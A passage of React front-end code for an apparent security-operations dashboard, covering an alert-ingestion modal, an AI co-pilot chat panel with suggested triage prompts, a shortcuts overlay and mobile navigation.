              {tools.filter(t=>!t.active&&!connectedTools[t.id]).length} tools not connected — <button onClick={()=>{setModal(null);setActiveTab('tools');}} style={{color:'#4f8fff',background:'none',border:'none',cursor:'pointer',fontFamily:'Inter,sans-serif',fontSize:'0.82rem',padding:0}}>Setup wizard →</button> or <button onClick={e=>{e.stopPropagation();setActiveTab('tools');}} style={{color:'#22d49a',background:'none',border:'none',cursor:'pointer',fontFamily:'inherit',fontSize:'inherit',padding:0}}>Tools tab →</button>
            </div>
          )}
        </Modal>
      )}

      {/* Alerts Ingested Modal */}
      {modal?.type==='alerts-ingested' && (
        <Modal title={`Alert Ingestion — What AI Did`} onClose={()=>setModal(null)}>
          <div style={{display:'grid',gridTemplateColumns:'repeat(3,1fr)',gap:8,marginBottom:16}} className='wt-three-col'>
            {[{val:alerts.length,label:'Ingested',c:'#4f8fff'},{val:fpAlerts.length,label:'Auto-Closed FPs',c:'#22d49a'},{val:tpAlerts.length,label:'Escalated TPs',c:'#f0405e'}].map(s=>(
              <div key={s.label} style={{textAlign:'center',padding:'10px',background:'var(--wt-bg)',borderRadius:8,border:'1px solid #1d2535'}}>
                <div style={{fontSize:'1.6rem',fontWeight:900,fontFamily:'JetBrains Mono,monospace',color:s.c,letterSpacing:-1}}>{s.val}</div>
                <div style={{fontSize:'0.84rem',color:'var(--wt-dim)'}}>{s.label}</div>
              </div>
            ))}
          </div>
          {alerts.map(a=>(
            <div key={a.id} style={{padding:'10px 0',borderBottom:'1px solid #1d2535'}}>
              <div style={{display:'flex',alignItems:'center',gap:8,marginBottom:2}}>
                <span style={{width:4,height:16,borderRadius:2,background:SEV_COLOR[a.severity],flexShrink:0}} />
                <span style={{fontSize:'0.86rem',fontWeight:600,flex:1}}>{a.title}</span>
                <span style={{fontSize:'0.8rem',fontWeight:800,padding:'2px 7px',borderRadius:3,color:(VERDICT_STYLE[a.verdict]||VERDICT_STYLE.Pending).c,background:(VERDICT_STYLE[a.verdict]||VERDICT_STYLE.Pending).bg}}>{a.verdict||'—'}</span>
              </div>
              {a.aiActions?.[0]&&<div style={{fontSize:'0.86rem',color:'#22d49a',paddingLeft:12}}>⚡ {a.aiActions?.[0]}</div>}
            </div>
          ))}
        </Modal>
      )}

      {/* ═══════════════════ CO-PILOT PANEL ═══════════════════ */}
      {showCopilot && (
        <div style={{position:'fixed',top:0,right:0,bottom:0,width:380,maxWidth:'100vw',zIndex:200,display:'flex',flexDirection:'column',background:'var(--wt-sidebar)',borderLeft:'1px solid var(--wt-border2)',boxShadow:'-8px 0 32px rgba(0,0,0,0.4)'}}>
          {/* Header */}
          <div style={{display:'flex',alignItems:'center',gap:10,padding:'14px 16px',borderBottom:'1px solid var(--wt-border)',flexShrink:0}}>
            <span style={{fontSize:'1rem',lineHeight:1}}>✦</span>
            <span style={{fontWeight:800,fontSize:'0.9rem',flex:1}}>AI Co-Pilot</span>
            <span style={{fontSize:'0.84rem',color:'#22d49a',background:'#22d49a10',padding:'1px 6px',borderRadius:3,border:'1px solid #22d49a20',fontWeight:700}}>
              {demoMode?'DEMO':'LIVE'} · {alerts.length} alerts
            </span>
            <span style={{fontSize:'0.8rem',fontWeight:800,padding:'2px 7px',borderRadius:4,background:'#4f8fff18',color:'#4f8fff',border:'1px solid #4f8fff30'}}>TEAM+</span>
            {copilotMessages.length>0&&<button onClick={()=>setCopilotMessages([])} title='Clear conversation' style={{background:'none',border:'1px solid var(--wt-border)',borderRadius:5,color:'var(--wt-dim)',fontSize:'0.86rem',cursor:'pointer',padding:'2px 7px',fontFamily:'Inter,sans-serif'}}>Clear</button>}
            <button onClick={()=>setShowCopilot(false)} aria-label='Close Co-Pilot' style={{background:'none',border:'none',color:'var(--wt-muted)',fontSize:'1.3rem',cursor:'pointer',lineHeight:1,padding:'0 4px'}}>×</button>
          </div>
          {!canUse('team') ? (
            <div style={{flex:1,display:'flex',flexDirection:'column',alignItems:'center',justifyContent:'center',padding:32,textAlign:'center',gap:12}}>
              <div style={{fontSize:'2rem'}}>🔒</div>
              <div style={{fontWeight:700,fontSize:'0.9rem'}}>Essentials plan required</div>
              <div style={{fontSize:'0.86rem',color:'var(--wt-muted)',lineHeight:1.6}}>AI Co-Pilot is available on Essentials plan and above. Ask security questions, generate detection queries, and get instant threat analysis.</div>
              <a href='/pricing' style={{padding:'8px 20px',background:'#4f8fff',color:'#fff',borderRadius:8,fontSize:'0.86rem',fontWeight:700,textDecoration:'none',marginTop:8}}>Upgrade to Essentials</a>
            </div>
          ) : (
            <>
              {/* Message thread */}
              <div style={{flex:1,overflowY:'auto',padding:'14px 16px',display:'flex',flexDirection:'column',gap:10}}>
                {copilotMessages.length===0 && (
                  <div style={{display:'flex',flexDirection:'column',gap:8,marginTop:8}}>
                    <div style={{fontSize:'0.86rem',color:'var(--wt-dim)',fontWeight:600,textTransform:'uppercase',letterSpacing:'0.5px',marginBottom:4}}>Suggested prompts</div>
                    <div style={{fontSize:'0.55rem',color:'var(--wt-dim)',marginBottom:4}}>These use your live data:</div>
                    {[
                      critAlerts.length>0?`Triage my top critical alert: ${critAlerts[0]?.title?.slice(0,40)||'unknown'}`:null,
                      `Summarise my current threat landscape`,
                      vulns.length>0?`What is the highest risk vulnerability in my estate?`:null,
                      gapDevices.length>0?`Which unmonitored devices are most at risk?`:null,
                      incidents.filter(i=>!deletedIncidents.has(i.id)&&(incidentStatuses[i.id]||i.status)==='Active').length>0?`Summarise my open cases for a shift handover`:null,
                      `Generate a Splunk query to hunt for lateral movement`,
                      `What should I prioritise right now?`,
                    ].filter(Boolean).slice(0,4).map(p=>(
                      <button key={p} onClick={()=>sendCopilotMessage(p)}
                        style={{padding:'8px 12px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:8,color:'var(--wt-secondary)',fontSize:'0.82rem',textAlign:'left',cursor:'pointer',fontFamily:'Inter,sans-serif',transition:'border-color .15s',lineHeight:1.4}}
                        onMouseEnter={e=>e.currentTarget.style.borderColor='#4f8fff40'}
                        onMouseLeave={e=>e.currentTarget.style.borderColor='var(--wt-border)'}
                      >{p}</button>
                    ))}
                  </div>
                )}
                {copilotMessages.map((msg,i)=>(
                  <div key={i} style={{display:'flex',flexDirection:'column',alignItems:msg.role==='user'?'flex-end':'flex-start',gap:3}}>
                    <div style={{maxWidth:'92%',padding:msg.role==='user'?'9px 13px':'12px 16px',borderRadius:msg.role==='user'?'12px 12px 4px 12px':'12px 12px 12px 4px',background:msg.role==='user'?'#4f8fff':'var(--wt-card)',border:msg.role==='user'?'none':'1px solid var(--wt-border)',fontSize:'0.86rem',color:msg.role==='user'?'#fff':'var(--wt-text)',lineHeight:1.65,wordBreak:'break-word'}}>
                      {msg.role==='assistant' && <div style={{fontSize:'0.66rem',fontWeight:800,color:'#4f8fff',letterSpacing:'1px',marginBottom:8,display:'flex',alignItems:'center',gap:5}}><span>✦</span><span>WATCHTOWER AI</span></div>}
                      {msg.role==='assistant' ? <WtMarkdown text={msg.text} compact={true} /> : msg.text}
                    </div>
                    {msg.ts && <span style={{fontSize:'0.55rem',color:'var(--wt-dim)',padding:'0 4px'}}>{msg.ts}</span>}
                  </div>
                ))}
                {copilotLoading && (
                  <div style={{display:'flex',alignItems:'flex-start',gap:8}}>
                    <div style={{padding:'9px 13px',background:'var(--wt-card)',border:'1px solid var(--wt-border)',borderRadius:'12px 12px 12px 4px',display:'flex',gap:5,alignItems:'center'}}>
                      {[0,1,2].map(i=><span key={i} style={{width:6,height:6,borderRadius:'50%',background:'#4f8fff',display:'inline-block',animation:'pulse 1.2s ease infinite',animationDelay:`${i*0.2}s`}} />)}
                    </div>
                  </div>
                )}
                <div ref={copilotBottomRef} />
              </div>
              {/* Input bar */}
              <div style={{padding:'12px 16px',borderTop:'1px solid var(--wt-border)',flexShrink:0,display:'flex',gap:8,alignItems:'flex-end'}}>
                <textarea
                  value={copilotInput}
                  onChange={e=>setCopilotInput(e.target.value)}
                  onKeyDown={e=>{if(e.key==='Enter'&&!e.shiftKey){e.preventDefault();sendCopilotMessage(copilotInput);}}}
                  placeholder='Ask a security question… (Enter to send)'
                  rows={2}
                  style={{flex:1,resize:'none',padding:'8px 12px',borderRadius:8,border:'1px solid var(--wt-border2)',background:'var(--wt-card)',color:'var(--wt-text)',fontSize:'0.86rem',fontFamily:'Inter,sans-serif',outline:'none',lineHeight:1.5}}
                />
                <button
                  onClick={()=>sendCopilotMessage(copilotInput)}
                  disabled={!copilotInput.trim()||copilotLoading}
                  style={{padding:'8px 14px',borderRadius:8,background:copilotInput.trim()&&!copilotLoading?'#4f8fff':'var(--wt-card)',border:'1px solid var(--wt-border2)',color:copilotInput.trim()&&!copilotLoading?'#fff':'var(--wt-dim)',fontSize:'0.86rem',fontWeight:700,cursor:copilotInput.trim()&&!copilotLoading?'pointer':'default',fontFamily:'Inter,sans-serif',flexShrink:0,transition:'all .15s',alignSelf:'flex-end'}}
                >↑</button>
              </div>
            </>
          )}
        </div>
      )}

      {/* KEYBOARD SHORTCUT HELP */}
      {showShortcuts && (
        <div style={{position:'fixed',inset:0,background:'rgba(0,0,0,0.75)',zIndex:300,display:'flex',alignItems:'center',justifyContent:'center',padding:20}} onClick={()=>setShowShortcuts(false)}>
          <div style={{background:'var(--wt-card)',border:'1px solid var(--wt-border2)',borderRadius:16,padding:28,maxWidth:420,width:'100%'}} onClick={e=>e.stopPropagation()}>
            <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:20}}>
              <span style={{fontSize:'0.88rem',fontWeight:800}}>⌨ Keyboard Shortcuts</span>
              <button onClick={()=>setShowShortcuts(false)} style={{background:'none',border:'none',color:'var(--wt-muted)',fontSize:'1.2rem',cursor:'pointer',lineHeight:1}}>×</button>
            </div>
            <div style={{display:'grid',gridTemplateColumns:'auto 1fr',gap:'8px 16px',fontSize:'0.86rem'}}>
              {[['G then O','Overview'],['G then A','Alerts'],['G then C','Coverage'],['G then V','Vulnerabilities'],['G then I','Intel'],['G then N','Incidents'],['G then T','Tools'],['G then S','Sales'],['?','Toggle this help'],['Esc','Close overlay']].map(([k,v])=>(
                <React.Fragment key={k}>
                  <kbd style={{background:'var(--wt-card2)',border:'1px solid var(--wt-border2)',borderRadius:5,padding:'2px 8px',fontFamily:'JetBrains Mono,monospace',fontSize:'0.86rem',color:'var(--wt-secondary)',whiteSpace:'nowrap'}}>{k}</kbd>
                  <span style={{color:'var(--wt-muted)',alignSelf:'center'}}>{v}</span>
                </React.Fragment>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* MOBILE BOTTOM NAV — 5 primary tabs + More drawer */}
      <nav className="wt-bottom-nav">
        {[{t:'overview',i:'📊',l:'Overview'},{t:'alerts',i:'🔔',l:'Alerts'},{t:'incidents',i:'📋',l:'Cases'},{t:'tools',i:'🔌',l:'Tools'}].map(({t,i,l})=>(
          <button key={t} className={activeTab===t?'active':''} onClick={()=>setActiveTab(t)} style={{position:'relative'}}>
            <span className="bnav-icon">{i}</span>{l}
            {t==='alerts'&&critAlerts.length>0&&<span style={{position:'absolute',top:4,right:'calc(50% - 12px)',width:7,height:7,borderRadius:'50%',background:'#f0405e',display:'block'}} />}
          </button>
        ))}
        <a href='/settings' className={''}>
          <span className="bnav-icon">⚙️</span>Settings
        </a>
        <button onClick={()=>setShowMobileMore(s=>!s)} className={showMobileMore?'active':''}>
          <span className="bnav-icon">⋯</span>More
        </button>
        {/* More drawer */}
        {showMobileMore&&(
          <div onClick={()=>setShowMobileMore(false)} style={{position:'fixed',inset:0,zIndex:300,background:'rgba(0,0,0,0.6)'}}>
            <div onClick={e=>e.stopPropagation()} style={{position:'absolute',bottom:64,left:0,right:0,background:'var(--wt-sidebar)',borderTop:'1px solid var(--wt-border2)',borderRadius:'16px 16px 0 0',padding:'12px 0 8px'}}>
              <div style={{width:36,height:4,borderRadius:2,background:'var(--wt-border2)',margin:'0 auto 12px'}} />
              <div style={{display:'grid',gridTemplateColumns:'repeat(4,1fr)',gap:0}}>
                {[
                  {t:'coverage',i:'🛡',l:'Coverage'},
                  {t:'vulns',i:'🔍',l:'Vulns'},
                  {t:'intel',i:'🌐',l:'Intel'},
                  ...((isAdmin||canUse('business'))?[{t:'compliance',i:'🗂',l:'Comply'}]:[]),
                  ...((isAdmin||userTier==='mssp')?[{t:'mssp',i:'🏢',l:'MSSP'}]:[]),
                  ...(isAdmin?[{t:'admin',i:'🔧',l:'Admin'}]:[]),
                ].map(({t,i,l})=>(
                  <button key={t} onClick={()=>{setActiveTab(t);setShowMobileMore(false);}}
                    style={{display:'flex',flexDirection:'column',alignItems:'center',gap:4,padding:'10px 4px',background:'none',border:'none',cursor:'pointer',color:activeTab===t?'#4f8fff':'var(--wt-muted)',fontFamily:'Inter,sans-serif',fontSize:'0.62rem',fontWeight:600}}>
                    <span style={{fontSize:'1.3rem'}}>{i}</span>{l}
                  </button>
                ))}
                <a href='/changelog' onClick={()=>setShowMobileMore(false)}
                  style={{display:'flex',flexDirection:'column',alignItems:'center',gap:4,padding:'10px 4px',color:'var(--wt-muted)',textDecoration:'none',fontFamily:'Inter,sans-serif',fontSize:'0.62rem',fontWeight:600}}>
                  <span style={{fontSize:'1.3rem'}}>📝</span>Log
                </a>
              </div>
            </div>
          </div>
        )}
      </nav>
    </div>
  );
}
